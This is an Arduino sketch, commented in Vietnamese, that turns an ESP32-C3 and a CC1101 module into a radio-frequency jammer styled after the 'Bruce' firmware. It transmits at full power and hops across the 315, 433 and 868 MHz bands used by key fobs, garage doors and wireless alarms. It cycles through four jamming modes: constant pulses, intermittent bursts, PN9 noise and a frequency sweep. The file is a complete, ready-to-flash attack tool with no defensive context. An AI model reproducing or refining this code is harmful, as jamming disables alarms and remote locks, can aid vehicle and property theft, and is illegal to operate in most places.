#include <Arduino.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>


#define CC1101_GDO0 10
#define CC1101_CS   5
#define CC1101_SCK  4
#define CC1101_MOSI 7
#define CC1101_MISO 6
#define LED_PIN     8   // Den onboard ESP32-C3 super mini

// Thoi gian chay moi che do truoc khi chuyen (ms) - giong chu ky Bruce
#define MODE_TIME_MS   6000
// Thoi gian mot phase trong che do FULL (Bruce dung 100ms)
#define PHASE_TIME_MS  100

enum JamMode { JAM_FULL, JAM_ITMT, JAM_NOISE, JAM_SWEEP, JAM_MODE_COUNT };
const char* MODE_NAMES[] = {"FULL POWER", "INTERMITTENT", "NOISE STORM", "FREQ SWEEP"};


const float jam_frequency_list[] = {
  
  315.000f, 330.000f, 345.000f, 350.000f,


  433.050f, 433.150f, 433.250f, 433.350f, 433.450f, 433.550f, 433.650f,
  433.750f, 433.850f, 433.920f, 434.000f, 434.100f, 434.190f, 434.300f,
  434.390f, 434.420f, 434.500f, 434.600f, 434.700f, 434.790f,

  
  868.000f, 868.300f, 868.400f, 868.800f, 868.950f
};
const int jam_frequency_count = sizeof(jam_frequency_list) / sizeof(jam_frequency_list[0]);

int freqIdx = 0;
JamMode jamMode = JAM_FULL;
unsigned long modeTimer = 0;
unsigned long ledTimer = 0;
bool ledState = false;


void cc1101BaseInit(float freq) {
  ELECHOUSE_cc1101.setMHZ(freq);
  ELECHOUSE_cc1101.setDeviation(47.6);   
  ELECHOUSE_cc1101.setRxBW(812);        
  ELECHOUSE_cc1101.setPA(12);           
}

void cc1101AsyncMode() {                 
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.setDRate(800);
  ELECHOUSE_cc1101.setModulation(2);      
  ELECHOUSE_cc1101.SetTx();
}


void runFullPower() {
  cc1101AsyncMode();
  unsigned long startPhase = millis();
  uint8_t phase = 0;

  while (millis() - modeTimer < MODE_TIME_MS) {
    unsigned long elapsed = millis() - modeTimer;
    phase = (elapsed / PHASE_TIME_MS) % 3;

    switch (phase) {
      case 0:

        for (int i = 0; i < 100; i++) {
          digitalWrite(CC1101_GDO0, HIGH);
          delayMicroseconds(3);
          digitalWrite(CC1101_GDO0, LOW);
          delayMicroseconds(1);
        }
        break;
      case 1:

        for (int i = 0; i < 50; i++) {
          uint32_t w = 2 + (micros() % 18);
          digitalWrite(CC1101_GDO0, HIGH);
          delayMicroseconds(w);
          digitalWrite(CC1101_GDO0, LOW);
          delayMicroseconds(1);
        }
        break;
      case 2:

        digitalWrite(CC1101_GDO0, HIGH);
        delayMicroseconds(80);
        digitalWrite(CC1101_GDO0, LOW);
        delayMicroseconds(2);
        digitalWrite(CC1101_GDO0, HIGH);
        delayMicroseconds(80);
        break;
    }
    yield();   
    (void)startPhase;
  }
  digitalWrite(CC1101_GDO0, LOW);
}

// 
void runIntermittent() {
  cc1101AsyncMode();
  while (millis() - modeTimer < MODE_TIME_MS) {
    
    unsigned long burstStart = millis();
    for (int i = 0; i < 500; i++) {
      uint32_t pulseWidth = 1 + (micros() % 60);
      digitalWrite(CC1101_GDO0, HIGH);
      delayMicroseconds(pulseWidth);
      digitalWrite(CC1101_GDO0, LOW);
      uint32_t spaceWidth = 1 + (micros() % 8);
      delayMicroseconds(spaceWidth);
      if (millis() - burstStart > 250) break;
    }
    yield();
  }
  digitalWrite(CC1101_GDO0, LOW);
}


void runNoiseStorm() {
  ELECHOUSE_cc1101.setSidle();
  ELECHOUSE_cc1101.setPktFormat(2);      // PN9 random TX mode
  ELECHOUSE_cc1101.setDRate(800);
  ELECHOUSE_cc1101.setModulation(2);     // ASK/OOK
  ELECHOUSE_cc1101.setDeviation(47.6);
  ELECHOUSE_cc1101.setRxBW(812);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.SetTx();

  static const uint8_t modSchemes[] = {2, 0, 1};  // ASK, 2FSK, MSK
  uint8_t modCycle = 2;
  unsigned long lastSwitch = 0;

  while (millis() - modeTimer < MODE_TIME_MS) {

    uint8_t newMod = ((millis() - modeTimer) / 3000) % 3;
    if (modSchemes[newMod] != modCycle) {
      modCycle = modSchemes[newMod];
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setModulation(modCycle);
      ELECHOUSE_cc1101.SetTx();
    }
    yield();
    (void)lastSwitch;
  }
  ELECHOUSE_cc1101.setSidle();
}


void runFreqSweep() {
  float baseFreq = jam_frequency_list[freqIdx];
  float sweepMin = baseFreq - 5.0f;
  float sweepMax = baseFreq + 5.0f;
  const float sweepStep = 0.05f;
  float currentFreq = sweepMin;
  bool forward = true;

  cc1101AsyncMode();
  digitalWrite(CC1101_GDO0, HIGH);

  while (millis() - modeTimer < MODE_TIME_MS) {
    ELECHOUSE_cc1101.setMHZ(currentFreq);

    
    for (int burst = 0; burst < 40; burst++) {
      digitalWrite(CC1101_GDO0, HIGH);
      delayMicroseconds(30);
      digitalWrite(CC1101_GDO0, LOW);
      delayMicroseconds(5);
    }

    if (forward) {
      currentFreq += sweepStep;
      if (currentFreq > sweepMax) { currentFreq = sweepMax; forward = false; }
    } else {
      currentFreq -= sweepStep;
      if (currentFreq < sweepMin) { currentFreq = sweepMin; forward = true; }
    }
    yield();
  }
  digitalWrite(CC1101_GDO0, LOW);
  ELECHOUSE_cc1101.setMHZ(baseFreq);
}


void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println(F("===== ESP-C3 JAMMER - BRUCE STYLE ====="));
  Serial.println(F("4 che do: FULL/ITMT/NOISE(PN9)/SWEEP"));

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.setGDO0(CC1101_GDO0);
  ELECHOUSE_cc1101.Init();
  pinMode(CC1101_GDO0, OUTPUT);

  cc1101BaseInit(jam_frequency_list[0]);

  modeTimer = millis();
  Serial.print(F("Freq #0: ")); Serial.println(jam_frequency_list[0]);
  digitalWrite(LED_PIN, LOW);
}

void loop() {
  // Nhay LED nhip tim
  if (millis() - ledTimer >= 100) {
    ledTimer = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? HIGH : LOW);
  }

  // Chay che do hien tai
  Serial.print(F(">>> Mode: ")); Serial.print(MODE_NAMES[jamMode]);
  Serial.print(F(" @ ")); Serial.println(jam_frequency_list[freqIdx]);
  modeTimer = millis();

  switch (jamMode) {
    case JAM_FULL:   runFullPower();   break;
    case JAM_ITMT:   runIntermittent(); break;
    case JAM_NOISE:  runNoiseStorm();  break;
    case JAM_SWEEP:  runFreqSweep();   break;
    default: break;
  }

 
  jamMode = (JamMode)((jamMode + 1) % JAM_MODE_COUNT);
  if (jamMode == JAM_FULL) {
    freqIdx = (freqIdx + 1) % jam_frequency_count;
    cc1101BaseInit(jam_frequency_list[freqIdx]);
    Serial.print(F("=== Hop sang ")); Serial.print(jam_frequency_list[freqIdx]); Serial.println(F(" MHz ==="));
  }
}
